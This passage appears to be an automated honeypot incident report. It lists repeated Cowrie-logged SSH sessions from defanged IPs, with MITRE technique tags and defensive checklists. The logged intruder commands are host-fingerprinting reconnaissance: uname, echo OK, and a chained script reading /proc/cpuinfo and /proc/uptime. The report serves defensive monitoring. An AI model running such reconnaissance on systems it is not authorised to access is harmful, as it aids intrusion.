- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4c3ee14ebf0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-27 12:35 |
| **Last Seen** | 2026-06-27 12:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:35:40` | `cowrie.session.connect` |
| `2026-06-27 12:35:40` | `cowrie.client.version` |
| `2026-06-27 12:35:40` | `cowrie.client.kex` |
| `2026-06-27 12:35:41` | `cowrie.login.success` |
| `2026-06-27 12:35:41` | `cowrie.session.params` |
| `2026-06-27 12:35:41` | `cowrie.command.input` |
| `2026-06-27 12:35:41` | `cowrie.command.input` |
| `2026-06-27 12:35:41` | `cowrie.command.input` |
| `2026-06-27 12:35:41` | `cowrie.command.input` |
| `2026-06-27 12:35:41` | `cowrie.log.closed` |
| `2026-06-27 12:35:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd793034bd0f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:35 |
| **Last Seen** | 2026-06-27 12:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:35:49` | `cowrie.session.connect` |
| `2026-06-27 12:35:49` | `cowrie.client.version` |
| `2026-06-27 12:35:49` | `cowrie.client.kex` |
| `2026-06-27 12:35:49` | `cowrie.login.success` |
| `2026-06-27 12:35:50` | `cowrie.session.params` |
| `2026-06-27 12:35:50` | `cowrie.command.input` |
| `2026-06-27 12:35:50` | `cowrie.log.closed` |
| `2026-06-27 12:35:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06d66c7e1487

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:36 |
| **Last Seen** | 2026-06-27 12:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:36:38` | `cowrie.session.connect` |
| `2026-06-27 12:36:38` | `cowrie.client.version` |
| `2026-06-27 12:36:38` | `cowrie.client.kex` |
| `2026-06-27 12:36:38` | `cowrie.login.success` |
| `2026-06-27 12:36:39` | `cowrie.session.params` |
| `2026-06-27 12:36:39` | `cowrie.command.input` |
| `2026-06-27 12:36:39` | `cowrie.log.closed` |
| `2026-06-27 12:36:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3312875c2023

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:37 |
| **Last Seen** | 2026-06-27 12:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:37:29` | `cowrie.session.connect` |
| `2026-06-27 12:37:29` | `cowrie.client.version` |
| `2026-06-27 12:37:29` | `cowrie.client.kex` |
| `2026-06-27 12:37:30` | `cowrie.login.success` |
| `2026-06-27 12:37:30` | `cowrie.session.params` |
| `2026-06-27 12:37:30` | `cowrie.command.input` |
| `2026-06-27 12:37:31` | `cowrie.log.closed` |
| `2026-06-27 12:37:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40ba41772284

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:38 |
| **Last Seen** | 2026-06-27 12:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:38:18` | `cowrie.session.connect` |
| `2026-06-27 12:38:18` | `cowrie.client.version` |
| `2026-06-27 12:38:18` | `cowrie.client.kex` |
| `2026-06-27 12:38:18` | `cowrie.login.success` |
| `2026-06-27 12:38:19` | `cowrie.session.params` |
| `2026-06-27 12:38:19` | `cowrie.command.input` |
| `2026-06-27 12:38:19` | `cowrie.log.closed` |
| `2026-06-27 12:38:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8825d4177d6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:39 |
| **Last Seen** | 2026-06-27 12:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:39:06` | `cowrie.session.connect` |
| `2026-06-27 12:39:06` | `cowrie.client.version` |
| `2026-06-27 12:39:06` | `cowrie.client.kex` |
| `2026-06-27 12:39:06` | `cowrie.login.success` |
| `2026-06-27 12:39:07` | `cowrie.session.params` |
| `2026-06-27 12:39:07` | `cowrie.command.input` |
| `2026-06-27 12:39:07` | `cowrie.log.closed` |
| `2026-06-27 12:39:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc674f048f09

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:39 |
| **Last Seen** | 2026-06-27 12:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:39:54` | `cowrie.session.connect` |
| `2026-06-27 12:39:54` | `cowrie.client.version` |
| `2026-06-27 12:39:54` | `cowrie.client.kex` |
| `2026-06-27 12:39:54` | `cowrie.login.success` |
| `2026-06-27 12:39:55` | `cowrie.session.params` |
| `2026-06-27 12:39:55` | `cowrie.command.input` |
| `2026-06-27 12:39:55` | `cowrie.log.closed` |
| `2026-06-27 12:39:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37a326ea3591

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:40 |
| **Last Seen** | 2026-06-27 12:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:40:42` | `cowrie.session.connect` |
| `2026-06-27 12:40:42` | `cowrie.client.version` |
| `2026-06-27 12:40:43` | `cowrie.client.kex` |
| `2026-06-27 12:40:43` | `cowrie.login.success` |
| `2026-06-27 12:40:44` | `cowrie.session.params` |
| `2026-06-27 12:40:44` | `cowrie.command.input` |
| `2026-06-27 12:40:44` | `cowrie.log.closed` |
| `2026-06-27 12:40:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa1078521a0c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 12:41 |
| **Last Seen** | 2026-06-27 12:41 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:41:15` | `cowrie.session.connect` |
| `2026-06-27 12:41:16` | `cowrie.client.version` |
| `2026-06-27 12:41:16` | `cowrie.client.kex` |
| `2026-06-27 12:41:21` | `cowrie.login.success` |
| `2026-06-27 12:41:24` | `cowrie.session.params` |
| `2026-06-27 12:41:24` | `cowrie.command.input` |
| `2026-06-27 12:41:25` | `cowrie.log.closed` |
| `2026-06-27 12:41:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ff039a0bded

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:41 |
| **Last Seen** | 2026-06-27 12:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:41:32` | `cowrie.session.connect` |
| `2026-06-27 12:41:32` | `cowrie.client.version` |
| `2026-06-27 12:41:32` | `cowrie.client.kex` |
| `2026-06-27 12:41:32` | `cowrie.login.success` |
| `2026-06-27 12:41:33` | `cowrie.session.params` |
| `2026-06-27 12:41:33` | `cowrie.command.input` |
| `2026-06-27 12:41:33` | `cowrie.log.closed` |
| `2026-06-27 12:41:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ac142b02913

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:42 |
| **Last Seen** | 2026-06-27 12:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:42:25` | `cowrie.session.connect` |
| `2026-06-27 12:42:25` | `cowrie.client.version` |
| `2026-06-27 12:42:25` | `cowrie.client.kex` |
| `2026-06-27 12:42:25` | `cowrie.login.success` |
| `2026-06-27 12:42:26` | `cowrie.session.params` |
| `2026-06-27 12:42:26` | `cowrie.command.input` |
| `2026-06-27 12:42:26` | `cowrie.log.closed` |
| `2026-06-27 12:42:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dee1a93a5a1c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-27 12:43 |
| **Last Seen** | 2026-06-27 12:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:43:07` | `cowrie.session.connect` |
| `2026-06-27 12:43:07` | `cowrie.client.version` |
| `2026-06-27 12:43:07` | `cowrie.client.kex` |
| `2026-06-27 12:43:07` | `cowrie.login.success` |
| `2026-06-27 12:43:08` | `cowrie.session.params` |
| `2026-06-27 12:43:08` | `cowrie.command.input` |
| `2026-06-27 12:43:08` | `cowrie.command.input` |
| `2026-06-27 12:43:08` | `cowrie.command.input` |
| `2026-06-27 12:43:08` | `cowrie.command.input` |
| `2026-06-27 12:43:08` | `cowrie.log.closed` |
| `2026-06-27 12:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b754989ebf65

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:43 |
| **Last Seen** | 2026-06-27 12:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:43:19` | `cowrie.session.connect` |
| `2026-06-27 12:43:19` | `cowrie.client.version` |
| `2026-06-27 12:43:19` | `cowrie.client.kex` |
| `2026-06-27 12:43:19` | `cowrie.login.success` |
| `2026-06-27 12:43:20` | `cowrie.session.params` |
| `2026-06-27 12:43:20` | `cowrie.command.input` |
| `2026-06-27 12:43:20` | `cowrie.log.closed` |
| `2026-06-27 12:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ae8159a0100

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 12:43 |
| **Last Seen** | 2026-06-27 12:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:43:23` | `cowrie.session.connect` |
| `2026-06-27 12:43:24` | `cowrie.client.version` |
| `2026-06-27 12:43:24` | `cowrie.client.kex` |
| `2026-06-27 12:43:26` | `cowrie.login.success` |
| `2026-06-27 12:43:27` | `cowrie.session.params` |
| `2026-06-27 12:43:27` | `cowrie.command.input` |
| `2026-06-27 12:43:27` | `cowrie.log.closed` |
| `2026-06-27 12:43:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adcab3bcb189

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:44 |
| **Last Seen** | 2026-06-27 12:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:44:10` | `cowrie.session.connect` |
| `2026-06-27 12:44:10` | `cowrie.client.version` |
| `2026-06-27 12:44:10` | `cowrie.client.kex` |
| `2026-06-27 12:44:10` | `cowrie.login.success` |
| `2026-06-27 12:44:11` | `cowrie.session.params` |
| `2026-06-27 12:44:11` | `cowrie.command.input` |
| `2026-06-27 12:44:11` | `cowrie.log.closed` |
| `2026-06-27 12:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fddd9dc692bf

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:45 |
| **Last Seen** | 2026-06-27 12:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:45:03` | `cowrie.session.connect` |
| `2026-06-27 12:45:03` | `cowrie.client.version` |
| `2026-06-27 12:45:03` | `cowrie.client.kex` |
| `2026-06-27 12:45:04` | `cowrie.login.success` |
| `2026-06-27 12:45:05` | `cowrie.session.params` |
| `2026-06-27 12:45:05` | `cowrie.command.input` |
| `2026-06-27 12:45:05` | `cowrie.log.closed` |
| `2026-06-27 12:45:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b951e0afaba

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:45 |
| **Last Seen** | 2026-06-27 12:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:45:57` | `cowrie.session.connect` |
| `2026-06-27 12:45:57` | `cowrie.client.version` |
| `2026-06-27 12:45:58` | `cowrie.client.kex` |
| `2026-06-27 12:45:58` | `cowrie.login.success` |
| `2026-06-27 12:45:59` | `cowrie.session.params` |
| `2026-06-27 12:45:59` | `cowrie.command.input` |
| `2026-06-27 12:45:59` | `cowrie.log.closed` |
| `2026-06-27 12:45:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0b21705bd5b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:46 |
| **Last Seen** | 2026-06-27 12:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:46:51` | `cowrie.session.connect` |
| `2026-06-27 12:46:51` | `cowrie.client.version` |
| `2026-06-27 12:46:51` | `cowrie.client.kex` |
| `2026-06-27 12:46:51` | `cowrie.login.success` |
| `2026-06-27 12:46:52` | `cowrie.session.params` |
| `2026-06-27 12:46:52` | `cowrie.command.input` |
| `2026-06-27 12:46:52` | `cowrie.log.closed` |
| `2026-06-27 12:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b4c4548c0c5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:47 |
| **Last Seen** | 2026-06-27 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:47:51` | `cowrie.session.connect` |
| `2026-06-27 12:47:51` | `cowrie.client.version` |
| `2026-06-27 12:47:51` | `cowrie.client.kex` |
| `2026-06-27 12:47:51` | `cowrie.login.success` |
| `2026-06-27 12:47:52` | `cowrie.session.params` |
| `2026-06-27 12:47:52` | `cowrie.command.input` |
| `2026-06-27 12:47:52` | `cowrie.log.closed` |
| `2026-06-27 12:47:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59584b54f8d3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:48 |
| **Last Seen** | 2026-06-27 12:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:48:47` | `cowrie.session.connect` |
| `2026-06-27 12:48:47` | `cowrie.client.version` |
| `2026-06-27 12:48:47` | `cowrie.client.kex` |
| `2026-06-27 12:48:48` | `cowrie.login.success` |
| `2026-06-27 12:48:48` | `cowrie.session.params` |
| `2026-06-27 12:48:48` | `cowrie.command.input` |
| `2026-06-27 12:48:48` | `cowrie.log.closed` |
| `2026-06-27 12:48:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bb116fa6091

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:49 |
| **Last Seen** | 2026-06-27 12:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:49:40` | `cowrie.session.connect` |
| `2026-06-27 12:49:40` | `cowrie.client.version` |
| `2026-06-27 12:49:40` | `cowrie.client.kex` |
| `2026-06-27 12:49:41` | `cowrie.login.success` |
| `2026-06-27 12:49:42` | `cowrie.session.params` |
| `2026-06-27 12:49:42` | `cowrie.command.input` |
| `2026-06-27 12:49:42` | `cowrie.log.closed` |
| `2026-06-27 12:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a94d6ea2fd99

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-27 12:50 |
| **Last Seen** | 2026-06-27 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:50:06` | `cowrie.session.connect` |
| `2026-06-27 12:50:06` | `cowrie.client.version` |
| `2026-06-27 12:50:06` | `cowrie.client.kex` |
| `2026-06-27 12:50:06` | `cowrie.login.success` |
| `2026-06-27 12:50:07` | `cowrie.session.params` |
| `2026-06-27 12:50:07` | `cowrie.command.input` |
| `2026-06-27 12:50:07` | `cowrie.command.input` |
| `2026-06-27 12:50:07` | `cowrie.command.input` |
| `2026-06-27 12:50:07` | `cowrie.command.input` |
| `2026-06-27 12:50:07` | `cowrie.log.closed` |
| `2026-06-27 12:50:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dfe0ba44cf4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:50 |
| **Last Seen** | 2026-06-27 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:50:31` | `cowrie.session.connect` |
| `2026-06-27 12:50:31` | `cowrie.client.version` |
| `2026-06-27 12:50:31` | `cowrie.client.kex` |
| `2026-06-27 12:50:32` | `cowrie.login.success` |
| `2026-06-27 12:50:32` | `cowrie.session.params` |
| `2026-06-27 12:50:32` | `cowrie.command.input` |
| `2026-06-27 12:50:33` | `cowrie.log.closed` |
| `2026-06-27 12:50:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe9534fddc70

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:51 |
| **Last Seen** | 2026-06-27 12:51 |
| **Session Duration** | 1s |
